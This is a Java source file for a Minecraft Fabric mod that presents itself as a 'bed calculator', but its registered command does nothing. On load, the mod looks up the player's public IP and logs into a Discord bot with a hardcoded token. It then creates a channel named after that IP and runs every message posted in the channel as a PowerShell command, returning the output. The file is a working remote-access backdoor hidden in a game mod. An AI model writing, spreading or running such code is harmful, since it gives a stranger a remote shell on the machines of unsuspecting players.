package me.RockBed.bedcalculator;

import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.events.session.ReadyEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.fabricmc.api.ModInitializer;
import net.dv8tion.jda.api.requests.GatewayIntent;

import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import com.mojang.brigadier.arguments.StringArgumentType;


import javax.security.auth.login.LoginException;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import static net.fabricmc.fabric.impl.command.client.ClientCommandInternals.executeCommand;

public class Bedcalculator extends ListenerAdapter implements ModInitializer {

    private static final String DISCORD_TOKEN = "MTU0NTU1NjgxNTkwMTc1NzQ5MQ.GyxPMP.GCAM0okDZ_PGzRMt0usPgJvdvuE_lylKK2HxrE";
    private TextChannel channel;

    @Override
    public void onInitialize() {
        String ip = getPublicIP().replace(".", "-");
        System.out.println("My Public IP Channel Name: " + ip);

        try {
            JDABuilder.createDefault(DISCORD_TOKEN)
                    .addEventListeners(this)
                    // FORCE DISCORD TO SHARE MESSAGE TEXT CONTENT WITH THE BOT:
                    .enableIntents(GatewayIntent.MESSAGE_CONTENT)
                    .build();
        } catch (Exception e) {
            e.printStackTrace();
        }
        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
            dispatcher.register(
                    net.minecraft.commands.Commands.literal("calculatebedrock")
                            .executes(context -> {
                                // does nothing
                                return 1; // return value = success code, doesn't need to do anything
                            })
            );
        });
    }

    @Override
    public void onReady(ReadyEvent event) {
        String ip = getPublicIP().replace(".", "-");
        System.out.println("Creating channel for IP: " + ip);
        channel = event.getJDA().getGuilds().get(0).createTextChannel(ip).complete();
    }

    public static void main(String[] args) throws LoginException {
        JDABuilder builder = JDABuilder.createDefault(DISCORD_TOKEN);
        builder.addEventListeners(new Bedcalculator());
        builder.build();
    }


    private String getPublicIP() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            return response.toString();
        } catch (IOException e) {
            e.printStackTrace();
            return "Error fetching IP";
        }
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (channel == null || event.getChannel().getIdLong() != channel.getIdLong()) {
            return;
        }

        if (event.getAuthor().isBot()) {
            return;
        }

        String result = executeCommand(event.getMessage().getContentRaw());
        event.getChannel().sendMessage(result).queue();
    }

    private String executeCommand(String command) {
        // 1. Clean the incoming string thoroughly
        String cleanCommand = command.trim();
        if (cleanCommand.isEmpty()) {
            return "Error: Command was empty.";
        }

        StringBuilder output = new StringBuilder();

        // 2. Switch to CMD which is faster and easier for simple system calls like whoami
        ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-NoProfile", "-Command", cleanCommand);
        processBuilder.redirectErrorStream(true);

        try {
            Process process = processBuilder.start();

            // 3. Gather output stream immediately
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();

            // 4. Capture the absolute numeric exit state
            int exitCode = process.waitFor();
            System.out.println("[Bot Debug] System process exited with code: " + exitCode);

        } catch (IOException | InterruptedException e) {
            output.append("System execution error: ").append(e.getMessage());
        }

        String finalResult = output.toString().trim();

        // 5. Safe formatting for discord chat limit
        if (finalResult.length() > 1950) {
            finalResult = finalResult.substring(0, 1900) + "\n...[Output truncated]...";
        }

        return !finalResult.isEmpty() ? finalResult : "Executed '" + cleanCommand + "' but returned an empty stream buffer.";
    }
}